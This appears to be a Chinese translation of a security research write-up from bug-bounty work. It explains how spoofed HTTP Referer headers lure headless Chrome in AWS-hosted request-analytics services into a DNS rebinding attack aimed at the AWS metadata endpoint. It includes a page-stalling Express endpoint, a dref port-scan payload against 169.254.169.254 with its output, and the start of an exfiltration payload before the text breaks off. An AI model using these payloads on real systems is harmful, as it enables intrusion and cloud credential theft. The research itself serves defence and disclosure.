原文：
在本文中，我们将为读者详细介绍攻击者是如何使用HTTP的Referer头部针对托管在AWS上的请求分析系统发动DNS重绑定攻击，从而破坏云环境的安全性的。
**简介**
* * *
虽然DNS重绑定攻击早在二十年前就已经面世，但最近一段时间以来，随着漏洞百出的物联网设备数量的激增，以及各种相关高危漏洞的连续曝光，这种“老迈”的技术竟然又焕发了第二春。与此同时，虽然DNS重绑定攻击的实施有些复杂，但是，随着相关利用框架的发布，例如MWR的[dref](https://github.com/mwrlabs/dref
"dref")框架以及Brannon Dorsey的[DNS Rebind
Toolkit](https://github.com/brannondorsey/dns-rebind-toolkit "DNS Rebind
Toolkit")，从而进一步降低了发动这种攻击的门槛。
尽管如此，人们对DNS重绑定攻击的讨论，还主要停留在理论层面。实际上，攻击者必须迫使受害者浏览自己控制下的网站并在那里停留一段时间，这种攻击才能奏效。当然，这些条件也是可以满足的，例如通过网络钓鱼或水坑攻击就能达到上述目的，之后，该攻击则需要借助于某些经过实战检验的有效载荷了。
随着dref的发布，攻击者开始寻找更加实用的攻击向量：可以提供直接利用途径，能限制或绕过人类交互的要求，并将DNS重绑定合法化。
当然，本文中介绍的这种攻击方法，只是我们在漏洞赏金计划中遇到的几个案例的概括和提炼。
**出发**
* * *
对于这种[HTTP的](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface "HTTP的")，PortSwigger的James
Kettle曾经发表过一篇出色的研究报告，并强调说，一些网站会“回过头来”向记录在入局流量中的引用网址发送HTTP请求。这样做的原因可能是用于市场营销，或者是为了进行威胁分析，等等。
下图演示了请求分析服务是如何面对攻击者提交的欺骗性URL的：
为了便于大规模发现具有这种行为的网站，MWR创建了reson8软件。该工具能够获取URL列表，并向每个URL发送带有伪造的HTTP头部的GET请求。对于给予响应的网站，该工具会详细记录与本研究有关的信息，例如往返时间、用户代理，以及是否执行了JavaScript代码。
我们发现，一些网站能够成功访问伪造的引用网址，并且，相应的往返时间从几分钟到几天不等。通过观察这些日志，我们发现其中的一部分是通过AWS的IP地址进行访问的，并且使用的是headless模式下的Chrome浏览器。
Headless
Chrome浏览器的应用，可能是基于JavaScript的Web框架的普及所致；实际上，我们的确发现浏览器启用了JavaScript执行功能。并且，这些浏览器通常还会启用240秒的默认页面加载超时设置。因此，这些服务已经满足了成功实施DNS重绑定攻击所需的初步条件。
通过设置dref服务器，并发送带有指向它的Referer
URL的请求，攻击者就可以在浏览器的内部网络的上下文中执行有效载荷。这样的话，攻击者就能够浏览网络，并从遇到的HTTP服务中提取信息。
**继续前进**
* * *
常见且稳定的DNS重绑定攻击要求受害者浏览器在有效荷载网站上至少逗留60秒。当然，这是为了满足浏览器内置的DNS缓存的要求。此外，基于浏览器的TCP端口扫描技术，在扫描C类子网的端口的时候，也需要花费差不多的时间。
由于Headless Chrome进程通常会在加载DOM时退出，因此，必须使浏览器“挂起”足够长的时间，才能完成上述过程。
为了达到这个目的，可以嵌入一个“”标签，该标签会尝试获取一幅声明的Content-Length大于实际长度的图像。这样的话，就有效地防止了加载DOM事件的触发，导致Chrome认为页面尚未完全加载。
我们可以通过[为dref添加相应的配置键](https://github.com/mwrlabs/dref/wiki/using-payloads#payload-configuration-keys
"为dref添加相应的配置键")，来让它使浏览器挂起。其实，/hang.png端点本身的Express.js实现是非常简单的，具体如下所示：
    // fetch an image that will never fully load
    router.get('/hang.png', function (req, res, next) {
      res.status(200).set({
        'Content-Length': '1'
      }).send()
    })
有了这些措施，攻击者就可以在浏览器中“长时间”执行JavaScript代码了，时间最多为4分钟。
**环境感知**
* * *
实际上，dref工具提供了一个基于浏览器的TCP端口扫描模块，即[netmap.js](https://github.com/serain/netmap.js
"netmap.js")。该模块可用于确定浏览器的本地IP地址，推断子网，继而扫描网络以获取TCP服务。这可能是一条行之有效的横向渗透路径。
但是，由于我们发现连接到攻击者控制的站点的Headless模式浏览器运行于AWS上的某个位置，所以更直接的方法是，与运行Headless模式浏览器的AWS实例可访问的AWS[元数据端点](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint.html
"元数据端点")进行交互（它始终位于169.254.169.254的80端口）。这个端点提供了该实例的大量信息，并且如果与SSRF漏洞结合使用的话，通常会更加得心应手。
下面给出的dref有效载荷可以用来验证能否从浏览器访问该服务：
    import NetMap from 'netmap.js'
    import Session from '../libs/session'
    const session = new Session()
    const netmap = new NetMap()
    function main () {
      netmap.tcpScan(['169.254.169.254'], [80, 1234, 4444]).then(results => {
        session.log(results)
      })
    }
    main()
如果这个有效载荷的返回结果显示80端口处于打开状态，那么可以推断出，该浏览器可以访问这个AWS元数据端点。此外，还需要扫描端口1234和4444以提供参考点来消除误报，因为正常情况下这两个端口应该处于关闭状态。
结果清楚地表明，端口80是开放的，并且是可达的：
    "hosts": [
      {
        "host": "169.254.169.254",
        "ports": [
            {"port": 80, "delta": 11, "open": true},
            {"port": 1234, "delta": 1000, "open": false},
            {"port": 4444, "delta": 1001, "open": false}
        ],
        "control": 1001
      }
    ]
**跨源提取数据**
* * *
AWS元数据端点是一项只读服务，因此，在CSRF或盲SSRF攻击中没有任何价值。为了证明该漏洞的安全影响，必须从该服务中获取响应。
由于浏览器的同源策略的缘故，所以，我们无法直接从“hooked”的浏览器向AWS元数据端点发送请求，并跨源发送响应。
不过，利用DNS重绑定技术，攻击者可以通过动态修改自己域名的IP地址使其指向所需目标，从而绕过这个安全策略。但是，目标端点必须满足这两个要求：目标服务接受任何Host头部，并且不使用SSL/TLS中进行封装。
大多数DNS重绑定框架都会利用iFrame加载重绑定攻击载荷，这也是dref的默认行为。就本例来说，目标浏览器似乎没有加载来自iFrames的内容（这看起来是基于粗略搜索的Headless
Chrome的行为）。
dref的灵活性在于，允许编写相关的有效载荷，以便在同一frame中完成整个攻击。下面的有效载荷可以接收单个HTTP
Path参数，并将来自端点的响应泄露给攻击者：
    import * as network from '../libs/network'
    import Session from '../libs/session'
    const session = new Session()
    async function main () {